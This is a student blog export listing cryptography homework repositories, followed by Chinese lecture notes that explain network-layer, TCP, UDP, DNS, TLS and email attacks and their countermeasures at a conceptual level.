<p>3.implement length extension attack for SM3, SHA256, etc</p>
<blockquote>
<font color=green>**SM3 length extension attack**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/SM3 length extension attack">Innovation-practice-homework/SM3 length extension attack at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>4.do your best to optimize SM3 implementation (software)</p>
<blockquote>
<font color=green>**SM3**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/SM3">Innovation-practice-homework/SM3 at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>5.Impl Merkle Tree following RFC6962</p>
<blockquote>
<font color=green>**Merkle Tree**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/Merkle Tree">Innovation-practice-homework/Merkle Tree at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>6.report on the application of this deduce technique in Ethereum with ECDSA</p>
<blockquote>
<font color=green>**ECDSA**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/ECDSA">Innovation-practice-homework/ECDSA at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>7.impl sm2 with RFC6979</p>
<blockquote>
<font color=green>**impl sm2**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/impl_sm2">Innovation-practice-homework/impl sm2 at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>8.verify the above pitfalls with proof-of-concept cod</p>
<blockquote>
<font color =green>**SM2_pitfalls**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/SM2_pitfalls">Innovation-practice-homework/SM2_pitfalls at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>9.Implement the above ECMH scheme</p>
<blockquote>
<font color =green>**ECMH**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/ECMH">Innovation-practice-homework/ECMH at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>10.Implement a PGP scheme with SM2</p>
<blockquote>
<font color=green>**PGP**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/PGP">Innovation-practice-homework/PGP at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>11.implement sm2 2P sign with real network communication</p>
<blockquote>
<font color=green>**SM2_2p**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/SM2_2p">Innovation-practice-homework/SM2_2p at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>12.implement sm2 2P decrypt with real network communication</p>
<blockquote>
<font color=green>**SM2_2p**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/SM2_2p">Innovation-practice-homework/SM2_2p at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>13.forge a signature to pretend that you are Satoshi</p>
<blockquote>
<font color=green>**ECDSA_forge**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/ECDSA_forge">Innovation-practice-homework/ECDSA_forge at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>14.Find a key with hash value “sdu_cst_20220610” under a message composed of your name followed by your student ID. For example, “San Zhan 202000460001”.</p>
<blockquote>
<font color=green>**Meow**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/Meow">Innovation-practice-homework/Meow at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>15.(附加)do your best to optimize SM4 implementation</p>
<blockquote>
<font color=green>**SM4**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/SM4">Innovation-practice-homework/SM4 at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Cryptograph</category>
      </categories>
      <tags>
        <tag>Cryptograph</tag>
      </tags>
  </entry>
  <entry>
    <title>Network Security(一)</title>
    <url>/2023/01/28/network2/</url>
    <content><![CDATA[<h3 id="Network-Security"><a href="#Network-Security" class="headerlink" title="Network Security"></a>Network Security</h3><h3 id="1-网络层次结构"><a href="#1-网络层次结构" class="headerlink" title="1.网络层次结构"></a>1.网络层次结构</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128113721360.png" alt="image-20230128113721360"></p>
<p>服务访问点（SAP）：某一层提供的服务</p>
<p>协议：对等层之间的交互规则，如最大数据包尺寸</p>
<p>层：为上面一层提供服务，使用下面一层的服务，通过一个实体来体现其功能，每层有一个或者多个实体，每一层定义为服务、功能和协议的集合，允许不同的供应商具有相同的功能</p>
<p>Protocal Data Unit(PDU):高层数据和本层协议或控制信息的组合，其中协议或控制信息由本层创建，被称为头部</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128114233635.png" alt="image-20230128114233635"></p>
<p>关键点：</p>
<p>1.协议定义对等层之间的通信规则</p>
<p>2.SAP指定层N的实体和N-1层实体的通信</p>
<p>3.服务由层N实体提供给层N+1的实体</p>
<p>4.实体与对等实体协调提供功能</p>
<h3 id="2-协议的基本功能"><a href="#2-协议的基本功能" class="headerlink" title="2.协议的基本功能"></a>2.协议的基本功能</h3><ul>
<li>拆分和重组：某一层对它上一层来的数据大小由限制，限制原因可能是缓冲区，协议头部空间或者物理链路，执行拆分的层要负责将重组的指令放在它的头部，指令内容包括数据包的数目和相对位置</li>
<li>封装</li>
<li>连接控制</li>
<li>顺序提交</li>
<li>流控制</li>
<li>出错控制</li>
<li>复用</li>
</ul>
<h3 id="3-网络协议"><a href="#3-网络协议" class="headerlink" title="3.网络协议"></a>3.网络协议</h3><h4 id="3-1-地址"><a href="#3-1-地址" class="headerlink" title="3.1 地址"></a>3.1 地址</h4><p>硬件地址一般是硬件提供商分配的，提供商为每个网络控制器分配一个唯一的地址，硬件控制器可以使用这个地址为过滤器，当然地址也可以改变</p>
<p>IP地址既可以动态分配，也可以静态分配，这通常取决于由谁提供对互联网的访问</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128150849776.png" alt="image-20230128150849776"></p>
<p>用户程序地址也就是端口号比硬件地址分配或者IP地址分配更缺少控制，最大的安全问题是应用程序是如何被授权的</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128151037642.png" alt="image-20230128151037642"></p>
<p>主机名称分配常常与政策有关</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128151129948.png" alt="image-20230128151129948"></p>
<h4 id="3-2-头部"><a href="#3-2-头部" class="headerlink" title="3.2 头部"></a>3.2 头部</h4><p>头部由两部分组成</p>
<ul>
<li>固定数据包型：易于解析，功能受限</li>
<li>无限制数据包型：很难解析，但是易于扩展</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128151417563.png" alt="image-20230128151417563"></p>
<h3 id="4-网络"><a href="#4-网络" class="headerlink" title="4.网络"></a>4.网络</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128151548677.png" alt="image-20230128151548677"></p>
<p>互联网是由互联的互联网服务提供商ISP组成的，一个ISP由一组互联的设备组成</p>
<h4 id="4-1寻址"><a href="#4-1寻址" class="headerlink" title="4.1寻址"></a>4.1寻址</h4><ul>
<li>不同的地址类型</li>
<li>硬件地址伪造</li>
<li>IP地址伪造</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128152413085.png" alt="image-20230128152413085"></p>
<h4 id="4-2-地址欺骗"><a href="#4-2-地址欺骗" class="headerlink" title="4.2 地址欺骗"></a>4.2 地址欺骗</h4><p>地址用于表明数据从哪来和来自谁，采用虚假的源地址的行为称为地址欺骗</p>
<h4 id="4-3-IP地址"><a href="#4-3-IP地址" class="headerlink" title="4.3 IP地址"></a>4.3 IP地址</h4><p>IP地址一共32bit，IP地址由两部分组成网络和主机</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128153535712.png" alt="image-20230128153535712"></p>
<p>大多数用户并不使用IP地址指定他们要连接的服务器和应用，而是使用主机名和域名，域名和IP地址之间的转换是通过称为域名服务(DNS)的分布式应用来完成，这个过程使用本地DNS和分布式DNS服务器之间进行通信，并进行主机全名（主机名+域名）和它IP地址之间的转换。</p>
<h4 id="4-4-客户服务器模式"><a href="#4-4-客户服务器模式" class="headerlink" title="4.4 客户服务器模式"></a>4.4 客户服务器模式</h4><p>服务器程序常常等待默认客户端口号请求连接，请求一个连接，就是服务器程序请求操作系统打开一个与TCP层的连接（一个套接字），并侦听目标为某个端口号的连接，</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128154518262.png" alt="image-20230128154518262"></p>
<h4 id="4-5路由"><a href="#4-5路由" class="headerlink" title="4.5路由"></a>4.5路由</h4><p>互联网使用的是无连接方法，即每一个数据包由每一个路由器分别处理，数据包由源设备发送到能处理它的下一个设备，那台设备然后检查它的本地路由表，并决定数据包要发送的下一个地点</p>
<p>静态路由表：在系统设置的时候创建，在小型网络或者只有一个出口的网络中使用</p>
<p>动态路由表：根据网络环境中的各种因素动态调整的路由表，常常在大型网络和多路出口网络中使用</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230129104424593.png" alt="image-20230129104424593"></p>
<h3 id="5-网络漏洞分类"><a href="#5-网络漏洞分类" class="headerlink" title="5.网络漏洞分类"></a>5.网络漏洞分类</h3><p>网络威胁模型，每一层都从下层收集到数据然后交给上一层，对每个数据包的载荷层是不分析的，攻击者可以通过把数据打包到载荷中，并在适当的头部中封装载荷，将数据传送到任何层</p>
<p>攻击点</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230129110700994.png" alt="image-20230129110700994"></p>
<p>攻击点1和3能够攻击任何连接到同一网络中的层，攻击点2能够攻击A1和B1上的TCP和应用层，并能攻击攻击者和目的网络之间任何设备的IP层，攻击点4是对计算机的攻击，是操作系统等漏洞 </p>
<p>在试探和相应的攻击代码已经在使用的情况下，漏洞才被广泛认知称为零日试探</p>
<p>Bugs：是实际执行行为偏离预期的行为</p>
<p>Vulnerabilities:漏洞是系统中的缺陷或弱点安全程序、设计、实施或可以执行的内部控制（意外触发或故意利用）并导致安全漏洞或违反系统的安全策略。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230130213936142.png" alt="image-20230130213936142"></p>
<h4 id="5-1-基于头部的漏洞和攻击"><a href="#5-1-基于头部的漏洞和攻击" class="headerlink" title="5.1 基于头部的漏洞和攻击"></a>5.1 基于头部的漏洞和攻击</h4><p>基于头部的漏洞是协议头部和标准发生了冲突，例如在头部中的某个域中使用了无效值。被发现很容易处理，但是由于其依赖于协议实现时出现的漏洞，很难发现</p>
<p>一个比较有代表性的基于头部的攻击的例子时死亡之ping（探测），某些操作系统不能处理IP头部的无效值，问题出在IP协议处理拆分与重组的方法上 ，当一个IP包被分片后，头部只包含每一个分片的长度，因此一旦被分片，只有在所有的IP数据包接受完之后才能确定整个IP包的总长度，当总长度超出缓冲区时就会出现攻击</p>
<h4 id="5-2-基于协议的漏洞和攻击"><a href="#5-2-基于协议的漏洞和攻击" class="headerlink" title="5.2 基于协议的漏洞和攻击"></a>5.2 基于协议的漏洞和攻击</h4><p>基于协议的漏洞是指所有所有的数据包都是有效的，但它们与协议的执行过程方面有冲突，一个协议就是指按照一定的顺序交换一串数据包，对协议的攻击有几种执行方式：</p>
<p>不按序发送数据包，发送数据包太快或者太慢，没有发送数据包，发送有效数据包到错误的协议层，发送有效的数据包到错误的混合数据包串中</p>
<p>​                          </p>
<p>一个典型的攻击是SYN flood也就是SYN雪崩式攻击，也就是只发送打开连接请求，不回应服务器连接请求，直到服务器的缓冲区满，不能再接受任何其他的请求</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230131160628532.png" alt="image-20230131160628532"></p>
<h4 id="5-3-基于验证的漏洞和攻击"><a href="#5-3-基于验证的漏洞和攻击" class="headerlink" title="5.3 基于验证的漏洞和攻击"></a>5.3 基于验证的漏洞和攻击</h4><p>验证是一个用户对另外一个用户认可的依据，验证通常会令人理解为用户名和密码。在网络安全中，验证是指一个层对另一个层的识别以执行它的功能</p>
<p>1.用户到用户的验证，指两个或者两个以上的用户的相互认可，通常是密钥和证书来完成的</p>
<p>2.用户到主机的验证，通常的形式是用户名和密码</p>
<p>3.两个应用，两个主机及两个网络层之间的验证叫做主机到主机的验证，一般使用地址实现，但是地址验证是比较脆弱的</p>
<p>4.由应用，主机或网络层给某个用户提供识别信息，叫做主机到用户的验证，验证是通过IP地址或者硬件地址实现的</p>
<h4 id="5-4基于流量的漏洞和攻击"><a href="#5-4基于流量的漏洞和攻击" class="headerlink" title="5.4基于流量的漏洞和攻击"></a>5.4基于流量的漏洞和攻击</h4><p>基于流量的漏洞和攻击集中在网络流量上，即网络上可能有大量的流量，攻击者能够截取流量并窃取信息</p>
<p>1.洪泛攻击：由单一的输入引起成千个数据包，广播报文，拒绝服务攻击</p>
<p>2.嗅探</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Network Security(四)</title>
    <url>/2023/02/07/network4/</url>
    <content><![CDATA[<h1 id="Network-Security"><a href="#Network-Security" class="headerlink" title="Network Security"></a>Network Security</h1><h2 id="传输层安全"><a href="#传输层安全" class="headerlink" title="传输层安全"></a>传输层安全</h2><p>传输层负责端到端的用户数据传输，进行差错控制和可靠的流量传输</p>
<h3 id="1-TCP"><a href="#1-TCP" class="headerlink" title="1.TCP"></a>1.TCP</h3><p>TCP是面向连接的传输协议，支持可靠的端到端的数据传输，使用端口号来区分数据包，有些过滤器只允许固定端口的流量进入，但前提是只有对应的应用使用固定的端口</p>
<p>tcp是面向连接的，分连接建立（三次握手），连接维护，连接终止（通过数据包交换来友好终止FIN，也可以发送一个RST数据包来强行进行终止连接，提供可靠的数据传输，有流量控制</p>
<p>TCP提供两个应用之间有序和可靠的数据传输</p>
<p>特殊服务</p>
<p>1.TCP支持数据流推送的特殊服务，应用层可以请求将TCP传输缓冲区中的数据推送到一个数据包中进行发送、</p>
<p>2.令一种特殊服务是紧急数据信号，应用可以将数据标识成紧急的，TCP层在数据包头部将其进行标明</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207170307674.png" alt="image-20230207170307674"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207170540864.png" alt="image-20230207170540864"></p>
<p>下面是TCP数据包的格式，TCP数据包封装在IP数据包之中</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207172039484.png" alt="image-20230207172039484"></p>
<h4 id="1-1基于头部的攻击"><a href="#1-1基于头部的攻击" class="headerlink" title="1.1基于头部的攻击"></a>1.1基于头部的攻击</h4><p>1.攻击者发送无效的头部信息，扰乱TCP层的运行</p>
<p>发送一些无效的标志组合，现在操作系统进行了修正，或者发送一些无效的序列号，会中断单个连接</p>
<p>2.第二类攻击又称为探测攻击，也就是攻击者使用回应发送无效头部为探测操作系统的一种方法</p>
<p>探测攻击软件使用一个特征列表，特征对某操作系统唯一，对无效标志组合的回应，以及对初始序列号的确定，探测攻击时很难消除的</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207173151121.png" alt="image-20230207173151121"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207174206116.png" alt="image-20230207174206116"></p>
<p>该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么判断该端口被屏蔽（Filtered）。因为该方式仅发送SYN包对目标主机的特定端口，但不建立的完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。</p>
<p>TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑选择的方式。</p>
<p>IN扫描向目标主机的端口发送的TCP FIN包或Xmas tree包/Null包，如果收到对方RST回复包，那么说明该端口是关闭的；没有收到RST包说明端口可能是开放的或被屏蔽的（open|filtered）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207174304991.png" alt="image-20230207174304991"></p>
<h4 id="1-2-基于协议的攻击"><a href="#1-2-基于协议的攻击" class="headerlink" title="1.2 基于协议的攻击"></a>1.2 基于协议的攻击</h4><p>TCP协议时复杂的协议</p>
<p>1.第一类是攻击者在 端点，并与攻击目标进行不正确的通信</p>
<p>2.第二类是攻击者能够嗅探到流量，并将数据包插入到TCP数据流中</p>
<p>1.</p>
<p>端点协议攻击通常是发送超出序列的数据包或者没有一次完整的握手</p>
<p>端点协议攻击：发送超出序列的数据包（只会终断当前连接，也可以用来确定os类型例如向等待连接的 端口发送RST）或不完成握手（SYN洪范攻击，可在网络入口处安装相应的过滤器，但分布式的就不好解 决）</p>
<p><font color='red'>SYN雪崩：</font>这以攻击的目的是消耗掉所有的TCP资源，迫使TCP拒绝进行其它的连接，发送足够多的SYN数据包而不发送ACK数据包</p>
<p>消除方法是限制来自同一源地址的半打开连接的数量，但是攻击者可以伪装成多个ip，或者在网络入口处来安装侦察这类攻击的网络过滤器，但攻击如果是分布式的，就难以区分</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207194550406.png" alt="image-20230207194550406"></p>
<p>2.如果攻击者能够看到流量，那么他就能够通过伪造IP地址并向双方发送RST来切断连接，攻击者不需要嗅探硬件地址，但是需要正确设置硬件地址，如下图中，攻击者在子网内截取了流量，那么发往服务器的硬件地址需要设置路由器，发送到受害者的硬件地址需要设置为受害者</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207194921581.png" alt="image-20230207194921581"></p>
<p>这个攻击可以使用加密的方式进行解决</p>
<p>Session hijacking会话劫持：这个攻击也需要攻击者能够访问到流量，会话劫持是从两方中的一方窃取连接并伪装成令一方的设备，当连接建立以后，攻击者就窃取到流量</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207195333865.png" alt="image-20230207195333865"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207195546866.png" alt="image-20230207195546866"></p>
<p>上述攻击的避免也需要对TCP载荷进行加密</p>
<p><font color='red'>Passive Network Filter:被动网络过滤器</font>过滤器监控所有网络流量，当它发现一个应被过滤的连接时，它使用会话劫持或者复位数据包来结束，对于用户看不到发回用户的冲突信息时，这时候就需要使用RST来进行关闭，另一种应用是流量整形器，目的是用于减少两个低优先级应用间的流量</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207200143413.png" alt="image-20230207200143413"></p>
<h4 id="1-3-基于验证的攻击"><a href="#1-3-基于验证的攻击" class="headerlink" title="1.3 基于验证的攻击"></a>1.3 基于验证的攻击</h4><p>TCP不支持验证，它用IP层提供所有的验证，使用端口号的攻击可以看成基于验证的攻击</p>
<h4 id="1-4-基于流量的攻击"><a href="#1-4-基于流量的攻击" class="headerlink" title="1.4 基于流量的攻击"></a>1.4 基于流量的攻击</h4><p>嗅探可能是一个问题，因为给会话劫持和TCP连接终止攻击了机会，QDS服务质量，流量整形</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207201042691.png" alt="image-20230207201042691"></p>
<h3 id="2-UDP"><a href="#2-UDP" class="headerlink" title="2.UDP"></a>2.UDP</h3><p>UDP协议的设计目的是为了允许应用使用无连接的传输层</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207201255664.png" alt="image-20230207201255664"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207201711937.png" alt="image-20230207201711937"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207202014983.png" alt="image-20230207202014983"></p>
<p>使用UDP也可以进行会话劫持</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207201959178.png" alt="image-20230207201959178"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207202108389.png" alt="image-20230207202108389"></p>
<h3 id="3-DNS"><a href="#3-DNS" class="headerlink" title="3.DNS"></a>3.DNS</h3><p>DNS用来将域名转换成一个IP地址，如果攻击者能够向客户端提供错误IP地址，DNS是一个非验证服务，完整域名(fully qualified name)FQDN,一个FQDN数据包含从层次的根一直到节点的全部域，第二种是完整域名一部分，PQDN</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207210407132.png" alt="image-20230207210407132"></p>
<p>委托创建域：可以增加可伸缩性，每次管理员委派创建一个子域时，都会创建一个新的管理单位，子域和父域可以进行单独的管理，这些单位被称为zones</p>
<p>DNS的另一个作用是将IP转换为域名，通常超过一个域名服务器对通过一个域是权威的，这能够保证冗余并且分散了负载</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207211222431.png" alt="image-20230207211222431"></p>
<p>DNS是为使用UDP协议而设计的，有两种DNS sever，一种是能够编辑数据的主要机，另一种是直接复制数据的从属机</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207211614574.png" alt="image-20230207211614574"></p>
<p>两种查询方式，一种是递归查询，一种是迭代查询</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207213618266.png" alt="image-20230207213618266"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207213701891.png" alt="image-20230207213701891"></p>
<p>DNS协议是为使用UDP协议设计的，一个客户端向一个侦听53端口的服务器发送请求，当回复大于512字节时，DNS支持TCP</p>
<p>DNS数据包格式：有两种形式，一种是查询，一种是回复，qr为0和1，</p>
<h4 id="3-1-基于头部的攻击"><a href="#3-1-基于头部的攻击" class="headerlink" title="3.1 基于头部的攻击"></a>3.1 基于头部的攻击</h4><p>DNS头部很复杂，但是如果DNS头部的值不正确，DNS服务器或者客户端将拒绝这个数据包，可以经过防火墙泄露数据</p>
<h4 id="3-2基于协议的攻击"><a href="#3-2基于协议的攻击" class="headerlink" title="3.2基于协议的攻击"></a>3.2基于协议的攻击</h4><p>DNS协议非常简单，它由查询和回应组成，除非发送欺骗数据并伪装成一台DNS服务器，但这种攻击最好划分到基于验证的攻击中</p>
<h4 id="3-3-基于验证的攻击"><a href="#3-3-基于验证的攻击" class="headerlink" title="3.3 基于验证的攻击"></a>3.3 基于验证的攻击</h4><p>1.DNS缓存中毒攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207215126962.png" alt="image-20230207215126962"></p>
<ul>
<li>敌手能力：能够访问两台DNS服务器之间的流量</li>
<li>攻击流程：攻击者嗅探到一台服务器的查询数据包，创建以恶意的回应，使收到回应的DNS服务器的缓冲区中放入恶意的条目，或者将恶意的条目放到additional中</li>
</ul>
<p>2.使用欺骗应答回应client请求</p>
<ul>
<li>敌手能力：能够访问到客户端和主机之间的流量</li>
<li>攻击：类似于DNS缓存中毒，但是破环范围为单一主机，host的表</li>
<li>减灾：安全的DNS协议,DNSSEC</li>
</ul>
<h4 id="3-4-基于流量的攻击"><a href="#3-4-基于流量的攻击" class="headerlink" title="3.4 基于流量的攻击"></a>3.4 基于流量的攻击</h4><p>嗅探攻击不会产生很大问题，因为DNS是公开信息</p>
<p>雪崩攻击就是向DNS服务器发送大量的DNS查询请求，但是DNS服务程序比较简单，很难造成崩溃，如果UDP被塞满，没有太大破坏，多尝试几次就好</p>
<p>还有一种是分布式拒绝服务攻击，也就是发送大量带有受害者主机IP地址的请求给服务器，这样服务器就会对IP地址源做出大量的回应造成拒绝服务攻击</p>
<p>减灾：对DNS服务器进行冗余处理</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207220350743.png" alt="image-20230207220350743"></p>
<h3 id="4-常用对策"><a href="#4-常用对策" class="headerlink" title="4.常用对策"></a>4.常用对策</h3><h4 id="4-1-传输层安全（TLS"><a href="#4-1-传输层安全（TLS" class="headerlink" title="4.1 传输层安全（TLS)"></a>4.1 传输层安全（TLS)</h4><p>传输层安全协议实际上是作为一个单独的层进行设计的，位于应用层和TCP之间，TLS/SSL协议就是为Web流量提供安全，针对验证攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207221022640.png" alt="image-20230207221022640"></p>
<ol>
<li>第一阶段是客户端和服务器同意使用加密和验证方法</li>
<li>第二阶段是服务器提供它的证书，并且有选择的询问客户端的证书</li>
<li>第三阶段就是客户端整数的提供</li>
<li>第四阶段就是双方交换会话密钥</li>
</ol>
<p>一种攻击是SSL stripping，也就是一种中间人的攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207222123756.png" alt="image-20230207222123756"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207222218923.png" alt="image-20230207222218923"></p>
<p>心脏滴血攻击：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207222630125.png" alt="image-20230207222630125"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207222857594.png" alt="image-20230207222857594"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230207222902995.png" alt="image-20230207222902995"></p>
<p>The following code shows how the OpenSSL library is fixed</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Network Security(五)</title>
    <url>/2023/02/07/network5/</url>
    <content><![CDATA[<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h3 id="1-基于头部的攻击"><a href="#1-基于头部的攻击" class="headerlink" title="1.基于头部的攻击"></a>1.基于头部的攻击</h3><p>应用层头部一般是非限制性的，最常见的就是头部缓冲区溢出，也就是收到的数据多于能接受的</p>
<h3 id="2-基于协议的攻击"><a href="#2-基于协议的攻击" class="headerlink" title="2.基于协议的攻击"></a>2.基于协议的攻击</h3><p>基于协议的攻击是随应用不同的，往往是为了规避应用程序采用的验证机制</p>
<h3 id="3-基于验证的攻击"><a href="#3-基于验证的攻击" class="headerlink" title="3.基于验证的攻击"></a>3.基于验证的攻击</h3><p>基于验证的攻击是随应用不同的，分为直接攻击和间接攻击</p>
<p>直接攻击 ：攻击者使用协议的验证部分 作为攻击 应用的途径</p>
<p>间接攻击：攻击者使用其它类型的攻击，头部，协议，流量来 规避验证</p>
<h3 id="4-基于流量的攻击"><a href="#4-基于流量的攻击" class="headerlink" title="4.基于流量的攻击"></a>4.基于流量的攻击</h3><p>Dｏｓ攻击</p>
<h1 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h1><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208101341616.png" alt="image-20230208101341616"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208101432589.png" alt="image-20230208101432589"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208104853816.png" alt="image-20230208104853816"></p>
<p>邮件服务器监听25端口号，tcp流，电子邮件信息为7位ASCII格式。 SMTP是命令-回应协议，一方发命令，另一方做出响应。</p>
<h3 id="1-基于头部的攻击-1"><a href="#1-基于头部的攻击-1" class="headerlink" title="1.基于头部的攻击"></a>1.基于头部的攻击</h3><p>基于头部的攻击不是很常见，因为头部比较简单，然和无效的命令和回应都会被忽略，早期存在缓冲区溢出的攻击</p>
<h3 id="2-基于协议的攻击-1"><a href="#2-基于协议的攻击-1" class="headerlink" title="2.基于协议的攻击"></a>2.基于协议的攻击</h3><p>消息的时间和顺序是受控的，任何违反都被忽略。</p>
<h3 id="3-基于验证的攻击-1"><a href="#3-基于验证的攻击-1" class="headerlink" title="3.基于验证的攻击"></a>3.基于验证的攻击</h3><p>最常见的SMTP攻击是采用伪冒发送者直接或者间接的过程调用中继手段，这类攻击称为电子邮件欺骗。一种被广泛采纳的对策是检查发送者的域是否有效，这是采用域名服务来实现的，但并不会检查发送者是否能真正代表发送地址，或者说和发送地址之间有关联。</p>
<h3 id="4-基于流量的攻击-1"><a href="#4-基于流量的攻击-1" class="headerlink" title="4.基于流量的攻击"></a>4.基于流量的攻击</h3><p>也就是通过大量的邮件让邮件服务器的磁盘变满</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230208114045780.png" alt="image-20230208114045780"></p>
